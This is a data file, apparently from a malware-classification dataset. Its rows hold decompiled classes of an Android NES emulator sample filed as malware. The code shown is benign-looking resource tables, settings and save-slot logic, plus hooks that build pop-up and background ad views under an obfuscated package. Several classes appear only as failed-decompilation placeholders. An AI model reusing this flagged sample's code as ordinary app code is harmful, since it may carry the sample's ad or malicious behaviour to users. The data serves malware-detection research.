"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\d.code","class d implements Runnable {   final c f315a;   public d(  c cVar){     this.f315a=cVar;   }   @Override public void run(){     EmulatorActivity emulatorActivity;     boolean loadROM;     EmulatorActivity emulatorActivity2;     EmulatorActivity emulatorActivity3;     EmulatorActivity emulatorActivity4;     EmulatorActivity emulatorActivity5;     ProgressDialog progressDialog;     EmulatorActivity emulatorActivity6;     ProgressDialog progressDialog2;     EmulatorActivity emulatorActivity7;     EmulatorActivity emulatorActivity8;     emulatorActivity=this.f315a.f314a;     loadROM=emulatorActivity.loadROM();     if (!loadROM) {       emulatorActivity8=this.f315a.f314a;       emulatorActivity8.finish();       return;     }     emulatorActivity2=this.f315a.f314a;     AbsoluteLayout absoluteLayout=(AbsoluteLayout)emulatorActivity2.findViewById(com.apkmore.rbjatnldymzfiw.R.id.float_pop_ad);     emulatorActivity3=this.f315a.f314a;     AbsoluteLayout absoluteLayout2=(AbsoluteLayout)emulatorActivity3.findViewById(com.apkmore.rbjatnldymzfiw.R.id.back_ad);     emulatorActivity4=this.f315a.f314a;     new o(emulatorActivity4,absoluteLayout,absoluteLayout2);     emulatorActivity5=this.f315a.f314a;     progressDialog=emulatorActivity5.mProgressDialog;     progressDialog.cancel();     emulatorActivity6=this.f315a.f314a;     progressDialog2=emulatorActivity6.mProgressDialog;     progressDialog2.hide();     emulatorActivity7=this.f315a.f314a;     emulatorActivity7.mProgressDialog=null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\drawable.code","public final class drawable {   public static final int buttons=0x7f020000;   public static final int dpad=0x7f020001;   public static final int extra_buttons=0x7f020002;   public static final int icon=0x7f020003;   public static final int select_start_buttons=0x7f020004; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\e.code","class e extends BaseAdapter {   final StateSlotsActivity f316a;   private File[] b=new File[10];   public e(  StateSlotsActivity stateSlotsActivity,  String str){     this.f316a=stateSlotsActivity;     for (int i=0; i < this.b.length; i++) {       this.b[i]=new File(StateSlotsActivity.getSlotFileName(str,i));     }   }   public void a(  int i){     if (((File)getItem(i)).delete()) {       notifyDataSetChanged();     }   }   @Override public int getCount(){     return this.b.length;   }   @Override public Object getItem(  int i){     return this.b[i];   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     View view2;     String slotName;     Bitmap screenshot;     LayoutInflater layoutInflater;     if (view == null) {       layoutInflater=this.f316a.inflater;       view2=layoutInflater.inflate(com.apkmore.rbjatnldymzfiw.R.layout.state_slot_item,(ViewGroup)null);     }  else {       view2=view;     }     TextView textView=(TextView)view2.findViewById(com.apkmore.rbjatnldymzfiw.R.id.name);     slotName=this.f316a.getSlotName(i);     textView.setText(slotName);     TextView textView2=(TextView)view2.findViewById(com.apkmore.rbjatnldymzfiw.R.id.detail);     ImageView imageView=(ImageView)view2.findViewById(com.apkmore.rbjatnldymzfiw.R.id.screenshot);     File file=(File)getItem(i);     if (file.exists()) {       textView2.setText(DateFormat.format(""yyyy-MM-dd hh:mm:ss"",file.lastModified()));       screenshot=StateSlotsActivity.getScreenshot(file);       imageView.setImageBitmap(screenshot);     }  else {       textView2.setText(this.f316a.getString(com.apkmore.rbjatnldymzfiw.R.string.slot_empty));       imageView.setImageBitmap(null);     }     return view2;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\EmulatorActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@771f20ac"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\EmulatorSettings.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4ced85ce"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\id.code","public final class id {   public static final int back_ad=0x7f080000;   public static final int detail=0x7f080008;   public static final int emulator=0x7f080001;   public static final int float_pop_ad=0x7f080002;   public static final int menu_close=0x7f08000d;   public static final int menu_load_state=0x7f080009;   public static final int menu_new_profile=0x7f08000e;   public static final int menu_reset=0x7f08000c;   public static final int menu_save_state=0x7f08000a;   public static final int menu_settings=0x7f08000b;   public static final int name=0x7f080007;   public static final int profile_name=0x7f080003;   public static final int screenshot=0x7f080006;   public static final int seekbar=0x7f080005;   public static final int value=0x7f080004; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\KeyPreference.code","!org.eclipse.jdt.core.dom.TypeDeclaration@65747f45"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\KeyProfilesActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@56ce3e2c"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\layout.code","public final class layout {   public static final int emulator=0x7f030000;   public static final int new_profile=0x7f030001;   public static final int seekbar_dialog=0x7f030002;   public static final int state_slot_item=0x7f030003; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\menu.code","public final class menu {   public static final int emulator=0x7f070000;   public static final int key_profiles=0x7f070001; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\R.code","public final class R { public final class array {     public static final int aspect_ratio_entries=0x7f05000d;     public static final int aspect_ratio_entryvalues=0x7f050002;     public static final int auto_sync_client_entries=0x7f050014;     public static final int auto_sync_client_entryvalues=0x7f05000a;     public static final int exit_game_options=0x7f05000b;     public static final int fast_forward_speed_entryvalues=0x7f050003;     public static final int file_chooser_filters=0x7f050000;     public static final int frame_skip_entries=0x7f05000e;     public static final int frame_skip_entryvalues=0x7f050004;     public static final int orientation_entries=0x7f050013;     public static final int orientation_entryvalues=0x7f050009;     public static final int refresh_rate_entries=0x7f05000f;     public static final int refresh_rate_entryvalues=0x7f050005;     public static final int scaling_mode_entries=0x7f05000c;     public static final int scaling_mode_entryvalues=0x7f050001;     public static final int second_controller_entries=0x7f050010;     public static final int second_controller_entryvalues=0x7f050006;     public static final int vkeypad_layout_entries=0x7f050012;     public static final int vkeypad_layout_entryvalues=0x7f050008;     public static final int vkeypad_size_entries=0x7f050011;     public static final int vkeypad_size_entryvalues=0x7f050007;   } public final class attr {   } public final class drawable {     public static final int buttons=0x7f020000;     public static final int dpad=0x7f020001;     public static final int extra_buttons=0x7f020002;     public static final int icon=0x7f020003;     public static final int select_start_buttons=0x7f020004;   } public final class id {     public static final int back_ad=0x7f080000;     public static final int detail=0x7f080008;     public static final int emulator=0x7f080001;     public static final int float_pop_ad=0x7f080002;     public static final int menu_close=0x7f08000d;     public static final int menu_load_state=0x7f080009;     public static final int menu_new_profile=0x7f08000e;     public static final int menu_reset=0x7f08000c;     public static final int menu_save_state=0x7f08000a;     public static final int menu_settings=0x7f08000b;     public static final int name=0x7f080007;     public static final int profile_name=0x7f080003;     public static final int screenshot=0x7f080006;     public static final int seekbar=0x7f080005;     public static final int value=0x7f080004;   } public final class layout {     public static final int emulator=0x7f030000;     public static final int new_profile=0x7f030001;     public static final int seekbar_dialog=0x7f030002;     public static final int state_slot_item=0x7f030003;   } public final class menu {     public static final int emulator=0x7f070000;     public static final int key_profiles=0x7f070001;   } public final class string {     public static final int about=0x7f06008f;     public static final int accurate_rendering=0x7f06004f;     public static final int accurate_rendering_prompt=0x7f060051;     public static final int accurate_rendering_summary=0x7f060050;     public static final int app_about=0x7f06008e;     public static final int app_label=0x7f060000;     public static final int appearance=0x7f060069;     public static final int aspect_ratio=0x7f060047;     public static final int audio_settings=0x7f060042;     public static final int audio_video_settings=0x7f060041;     public static final int auto_sync_client=0x7f06007b;     public static final int auto_sync_client_interval=0x7f06007c;     public static final int bios=0x7f060080;     public static final int bluetooth_client=0x7f060020;     public static final int bluetooth_server=0x7f06001f;     public static final int bluetooth_server_listening=0x7f06002f;     public static final int button_scan=0x7f060040;     public static final int change_disk=0x7f060019;     public static final int cheating=0x7f06007e;     public static final int client_connecting=0x7f06002e;     public static final int close=0x7f060028;     public static final int connect_failed=0x7f06002a;     public static final int connection_closed=0x7f060029;     public static final int disable_extra_buttons=0x7f060070;     public static final int disk_side=0x7f06001a;     public static final int dpad_4way=0x7f060061;     public static final int dpad_deadzone=0x7f060062;     public static final int emulator_service_running=0x7f060001;     public static final int enable_game_genie=0x7f06007f;     public static final int enable_sensor=0x7f060076;     public static final int enable_sound=0x7f060043;     public static final int enable_trackball=0x7f060074;     public static final int enable_vibrator=0x7f06005e;     public static final int enable_vkeypad=0x7f06005f;     public static final int fast_forward=0x7f060022;     public static final int fast_forward_speed=0x7f060048;     public static final int fds_rom=0x7f060082;     public static final int flip_screen=0x7f060084;     public static final int flip_screen_summary=0x7f060085;     public static final int frame_skip_mode=0x7f06004a;     public static final int frame_skip_settings=0x7f060049;     public static final int full_screen_mode=0x7f060086;     public static final int full_screen_mode_summary=0x7f060087;     public static final int game_genie_rom=0x7f060081;     public static final int gamepad_1=0x7f060057;     public static final int gamepad_2=0x7f060058;     public static final int gamepad_A=0x7f06009f;     public static final int gamepad_AB=0x7f0600a3;     public static final int gamepad_A_turbo=0x7f0600a1;     public static final int gamepad_B=0x7f0600a0;     public static final int gamepad_B_turbo=0x7f0600a2;     public static final int gamepad_down=0x7f060096;     public static final int gamepad_down_left=0x7f06009b;     public static final int gamepad_down_right=0x7f06009c;     public static final int gamepad_left=0x7f060097;     public static final int gamepad_right=0x7f060098;     public static final int gamepad_select=0x7f06009d;     public static final int gamepad_start=0x7f06009e;     public static final int gamepad_up=0x7f060095;     public static final int gamepad_up_left=0x7f060099;     public static final int gamepad_up_right=0x7f06009a;     public static final int help=0x7f06000b;     public static final int hide_buttons=0x7f06006e;     public static final int hide_controls=0x7f06006c;     public static final int hide_dpad=0x7f06006d;     public static final int hide_extra_buttons=0x7f06006f;     public static final int hide_select_start=0x7f060071;     public static final int in_between_press=0x7f060064;     public static final int in_between_press_summary=0x7f060065;     public static final int input_settings=0x7f060052;     public static final int invalid_dir=0x7f060007;     public static final int invalid_ip_address=0x7f060032;     public static final int invalid_port=0x7f060033;     public static final int ip_address=0x7f060030;     public static final int key_clear=0x7f060094;     public static final int key_mappings=0x7f060055;     public static final int key_mappings_summary=0x7f060056;     public static final int key_none=0x7f060092;     public static final int key_profiles=0x7f060034;     public static final int key_unknown=0x7f060093;     public static final int launcher_shortcut_name=0x7f060002;     public static final int layout_margin=0x7f060073;     public static final int load_profile=0x7f060038;     public static final int load_rom_failed=0x7f06000c;     public static final int load_state=0x7f060027;     public static final int load_state_title=0x7f060011;     public static final int max_frame_skips=0x7f06004b;     public static final int max_frame_skips_summary=0x7f06004c;     public static final int max_frames_ahead=0x7f060079;     public static final int max_frames_ahead_summary=0x7f06007a;     public static final int menu_delete=0x7f060004;     public static final int menu_edit=0x7f060003;     public static final int multitouch_unsupported=0x7f060060;     public static final int netplay_connect=0x7f06001b;     public static final int netplay_disconnect=0x7f06001c;     public static final int netplay_settings=0x7f060078;     public static final int netplay_sync=0x7f060021;     public static final int new_profile=0x7f060035;     public static final int new_profile_error=0x7f060037;     public static final int new_profile_title=0x7f060036;     public static final int no_fast_forward=0x7f060023;     public static final int no_files_in_folder=0x7f060006;     public static final int none_found=0x7f06003d;     public static final int none_paired=0x7f06003c;     public static final int orientation=0x7f060088;     public static final int orientation_summary=0x7f060089;     public static final int other_settings=0x7f06007d;     public static final int point_size_press=0x7f060066;     public static final int point_size_press_summary=0x7f060067;     public static final int point_size_press_threshold=0x7f060068;     public static final int port=0x7f060031;     public static final int power=0x7f060018;     public static final int press_key_prompt=0x7f060091;     public static final int protocol_incompatible=0x7f06002b;     public static final int quick_load=0x7f06005a;     public static final int quick_load_on_start=0x7f06008a;     public static final int quick_load_on_start_summary=0x7f06008b;     public static final int quick_save=0x7f06005b;     public static final int quit_game_title=0x7f060010;     public static final int refresh=0x7f060008;     public static final int refresh_rate=0x7f06004d;     public static final int refresh_rate_summary=0x7f06004e;     public static final int replace_game_message=0x7f06000f;     public static final int replace_game_title=0x7f06000e;     public static final int reset=0x7f060017;     public static final int rom_not_supported=0x7f06000d;     public static final int save_profile=0x7f060039;     public static final int save_state=0x7f060026;     public static final int save_state_title=0x7f060012;     public static final int scaling_mode=0x7f060046;     public static final int scanning=0x7f06003a;     public static final int screenshot=0x7f060024;     public static final int screenshot_saved=0x7f060025;     public static final int search_roms=0x7f06000a;     public static final int second_controller=0x7f060053;     public static final int second_controller_summary=0x7f060054;     public static final int select_device=0x7f06003b;     public static final int sensor_sensitivity=0x7f060077;     public static final int settings=0x7f060016;     public static final int shortcut_keys=0x7f060059;     public static final int shortcut_name=0x7f060009;     public static final int slot_empty=0x7f060015;     public static final int slot_nth=0x7f060014;     public static final int slot_quick=0x7f060013;     public static final int sound_volume=0x7f060044;     public static final int title_other_devices=0x7f06003f;     public static final int title_paired_devices=0x7f06003e;     public static final int title_select_rom=0x7f060005;     public static final int trackball_sensitivity=0x7f060075;     public static final int two_buttons_press=0x7f060063;     public static final int upgrade=0x7f060090;     public static final int use_input_method=0x7f06008c;     public static final int use_input_method_summary=0x7f06008d;     public static final int user_settings=0x7f060083;     public static final int video_settings=0x7f060045;     public static final int vkeypad_layout=0x7f060072;     public static final int vkeypad_settings=0x7f06005c;     public static final int vkeypad_settings_summary=0x7f06005d;     public static final int vkeypad_size=0x7f06006a;     public static final int vkeypad_transparency=0x7f06006b;     public static final int wifi_client=0x7f06001e;     public static final int wifi_not_available=0x7f06002c;     public static final int wifi_server=0x7f06001d;     public static final int wifi_server_listening=0x7f06002d;   } public final class xml {     public static final int preferences=0x7f040000;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\RGPlayer.code","!org.eclipse.jdt.core.dom.TypeDeclaration@59b3f22"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\SeekBarPreference.code","public class SeekBarPreference extends DialogPreference implements SeekBar.OnSeekBarChangeListener {   private static final String NS="""";   private int maxValue;   private int minValue;   private int newValue;   private int oldValue;   private SeekBar seekBar;   private TextView valueView;   public SeekBarPreference(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.minValue=attributeSet.getAttributeIntValue("""",""minValue"",0);     this.maxValue=attributeSet.getAttributeIntValue("""",""maxValue"",100);     setDialogLayoutResource(com.apkmore.rbjatnldymzfiw.R.layout.seekbar_dialog);     setPositiveButtonText(android.R.string.ok);     setNegativeButtonText(android.R.string.cancel);   }   @Override protected void onBindDialogView(  View view){     super.onBindDialogView(view);     if (this.newValue < this.minValue) {       this.newValue=this.minValue;     }     if (this.newValue > this.maxValue) {       this.newValue=this.maxValue;     }     this.seekBar=(SeekBar)view.findViewById(com.apkmore.rbjatnldymzfiw.R.id.seekbar);     this.seekBar.setMax(this.maxValue - this.minValue);     this.seekBar.setProgress(this.newValue - this.minValue);     this.seekBar.setSecondaryProgress(this.newValue - this.minValue);     this.seekBar.setOnSeekBarChangeListener(this);     this.valueView=(TextView)view.findViewById(com.apkmore.rbjatnldymzfiw.R.id.value);     this.valueView.setText(Integer.toString(this.newValue));   }   @Override protected void onDialogClosed(  boolean z){     super.onDialogClosed(z);     if (!z) {       this.newValue=this.oldValue;     }  else {       this.oldValue=this.newValue;       persistInt(this.newValue);     }   }   @Override protected Object onGetDefaultValue(  TypedArray typedArray,  int i){     return Integer.valueOf(typedArray.getInteger(i,0));   }   @Override public void onProgressChanged(  SeekBar seekBar,  int i,  boolean z){     this.newValue=this.minValue + i;     this.valueView.setText(Integer.toString(this.newValue));   }   @Override protected void onSetInitialValue(  boolean z,  Object obj){     this.oldValue=z ? getPersistedInt(0) : ((Integer)obj).intValue();     this.newValue=this.oldValue;   }   @Override public void onStartTrackingTouch(  SeekBar seekBar){   }   @Override public void onStopTrackingTouch(  SeekBar seekBar){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\StateSlotsActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@b6e6530"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\string.code","public final class string {   public static final int about=0x7f06008f;   public static final int accurate_rendering=0x7f06004f;   public static final int accurate_rendering_prompt=0x7f060051;   public static final int accurate_rendering_summary=0x7f060050;   public static final int app_about=0x7f06008e;   public static final int app_label=0x7f060000;   public static final int appearance=0x7f060069;   public static final int aspect_ratio=0x7f060047;   public static final int audio_settings=0x7f060042;   public static final int audio_video_settings=0x7f060041;   public static final int auto_sync_client=0x7f06007b;   public static final int auto_sync_client_interval=0x7f06007c;   public static final int bios=0x7f060080;   public static final int bluetooth_client=0x7f060020;   public static final int bluetooth_server=0x7f06001f;   public static final int bluetooth_server_listening=0x7f06002f;   public static final int button_scan=0x7f060040;   public static final int change_disk=0x7f060019;   public static final int cheating=0x7f06007e;   public static final int client_connecting=0x7f06002e;   public static final int close=0x7f060028;   public static final int connect_failed=0x7f06002a;   public static final int connection_closed=0x7f060029;   public static final int disable_extra_buttons=0x7f060070;   public static final int disk_side=0x7f06001a;   public static final int dpad_4way=0x7f060061;   public static final int dpad_deadzone=0x7f060062;   public static final int emulator_service_running=0x7f060001;   public static final int enable_game_genie=0x7f06007f;   public static final int enable_sensor=0x7f060076;   public static final int enable_sound=0x7f060043;   public static final int enable_trackball=0x7f060074;   public static final int enable_vibrator=0x7f06005e;   public static final int enable_vkeypad=0x7f06005f;   public static final int fast_forward=0x7f060022;   public static final int fast_forward_speed=0x7f060048;   public static final int fds_rom=0x7f060082;   public static final int flip_screen=0x7f060084;   public static final int flip_screen_summary=0x7f060085;   public static final int frame_skip_mode=0x7f06004a;   public static final int frame_skip_settings=0x7f060049;   public static final int full_screen_mode=0x7f060086;   public static final int full_screen_mode_summary=0x7f060087;   public static final int game_genie_rom=0x7f060081;   public static final int gamepad_1=0x7f060057;   public static final int gamepad_2=0x7f060058;   public static final int gamepad_A=0x7f06009f;   public static final int gamepad_AB=0x7f0600a3;   public static final int gamepad_A_turbo=0x7f0600a1;   public static final int gamepad_B=0x7f0600a0;   public static final int gamepad_B_turbo=0x7f0600a2;   public static final int gamepad_down=0x7f060096;   public static final int gamepad_down_left=0x7f06009b;   public static final int gamepad_down_right=0x7f06009c;   public static final int gamepad_left=0x7f060097;   public static final int gamepad_right=0x7f060098;   public static final int gamepad_select=0x7f06009d;   public static final int gamepad_start=0x7f06009e;   public static final int gamepad_up=0x7f060095;   public static final int gamepad_up_left=0x7f060099;   public static final int gamepad_up_right=0x7f06009a;   public static final int help=0x7f06000b;   public static final int hide_buttons=0x7f06006e;   public static final int hide_controls=0x7f06006c;   public static final int hide_dpad=0x7f06006d;   public static final int hide_extra_buttons=0x7f06006f;   public static final int hide_select_start=0x7f060071;   public static final int in_between_press=0x7f060064;   public static final int in_between_press_summary=0x7f060065;   public static final int input_settings=0x7f060052;   public static final int invalid_dir=0x7f060007;   public static final int invalid_ip_address=0x7f060032;   public static final int invalid_port=0x7f060033;   public static final int ip_address=0x7f060030;   public static final int key_clear=0x7f060094;   public static final int key_mappings=0x7f060055;   public static final int key_mappings_summary=0x7f060056;   public static final int key_none=0x7f060092;   public static final int key_profiles=0x7f060034;   public static final int key_unknown=0x7f060093;   public static final int launcher_shortcut_name=0x7f060002;   public static final int layout_margin=0x7f060073;   public static final int load_profile=0x7f060038;   public static final int load_rom_failed=0x7f06000c;   public static final int load_state=0x7f060027;   public static final int load_state_title=0x7f060011;   public static final int max_frame_skips=0x7f06004b;   public static final int max_frame_skips_summary=0x7f06004c;   public static final int max_frames_ahead=0x7f060079;   public static final int max_frames_ahead_summary=0x7f06007a;   public static final int menu_delete=0x7f060004;   public static final int menu_edit=0x7f060003;   public static final int multitouch_unsupported=0x7f060060;   public static final int netplay_connect=0x7f06001b;   public static final int netplay_disconnect=0x7f06001c;   public static final int netplay_settings=0x7f060078;   public static final int netplay_sync=0x7f060021;   public static final int new_profile=0x7f060035;   public static final int new_profile_error=0x7f060037;   public static final int new_profile_title=0x7f060036;   public static final int no_fast_forward=0x7f060023;   public static final int no_files_in_folder=0x7f060006;   public static final int none_found=0x7f06003d;   public static final int none_paired=0x7f06003c;   public static final int orientation=0x7f060088;   public static final int orientation_summary=0x7f060089;   public static final int other_settings=0x7f06007d;   public static final int point_size_press=0x7f060066;   public static final int point_size_press_summary=0x7f060067;   public static final int point_size_press_threshold=0x7f060068;   public static final int port=0x7f060031;   public static final int power=0x7f060018;   public static final int press_key_prompt=0x7f060091;   public static final int protocol_incompatible=0x7f06002b;   public static final int quick_load=0x7f06005a;   public static final int quick_load_on_start=0x7f06008a;   public static final int quick_load_on_start_summary=0x7f06008b;   public static final int quick_save=0x7f06005b;   public static final int quit_game_title=0x7f060010;   public static final int refresh=0x7f060008;   public static final int refresh_rate=0x7f06004d;   public static final int refresh_rate_summary=0x7f06004e;   public static final int replace_game_message=0x7f06000f;   public static final int replace_game_title=0x7f06000e;   public static final int reset=0x7f060017;   public static final int rom_not_supported=0x7f06000d;   public static final int save_profile=0x7f060039;   public static final int save_state=0x7f060026;   public static final int save_state_title=0x7f060012;   public static final int scaling_mode=0x7f060046;   public static final int scanning=0x7f06003a;   public static final int screenshot=0x7f060024;   public static final int screenshot_saved=0x7f060025;   public static final int search_roms=0x7f06000a;   public static final int second_controller=0x7f060053;   public static final int second_controller_summary=0x7f060054;   public static final int select_device=0x7f06003b;   public static final int sensor_sensitivity=0x7f060077;   public static final int settings=0x7f060016;   public static final int shortcut_keys=0x7f060059;   public static final int shortcut_name=0x7f060009;   public static final int slot_empty=0x7f060015;   public static final int slot_nth=0x7f060014;   public static final int slot_quick=0x7f060013;   public static final int sound_volume=0x7f060044;   public static final int title_other_devices=0x7f06003f;   public static final int title_paired_devices=0x7f06003e;   public static final int title_select_rom=0x7f060005;   public static final int trackball_sensitivity=0x7f060075;   public static final int two_buttons_press=0x7f060063;   public static final int upgrade=0x7f060090;   public static final int use_input_method=0x7f06008c;   public static final int use_input_method_summary=0x7f06008d;   public static final int user_settings=0x7f060083;   public static final int video_settings=0x7f060045;   public static final int vkeypad_layout=0x7f060072;   public static final int vkeypad_settings=0x7f06005c;   public static final int vkeypad_settings_summary=0x7f06005d;   public static final int vkeypad_size=0x7f06006a;   public static final int vkeypad_transparency=0x7f06006b;   public static final int wifi_client=0x7f06001e;   public static final int wifi_not_available=0x7f06002c;   public static final int wifi_server=0x7f06001d;   public static final int wifi_server_listening=0x7f06002d; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.uugloo.uuemu.nes\xml.code","public final class xml {   public static final int preferences=0x7f040000; } "
